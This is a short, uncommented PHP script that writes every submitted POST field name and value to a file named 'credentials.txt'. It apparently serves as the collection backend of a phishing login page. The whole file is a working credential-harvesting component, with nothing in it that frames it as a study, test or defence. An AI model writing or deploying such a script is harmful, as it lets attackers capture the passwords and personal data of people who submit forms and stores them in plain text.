<?php
$handle = fopen("credentials.txt", "a");
file_put_contents('credentials.txt', '');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, PHP_EOL);
}
fclose($handle);
?>
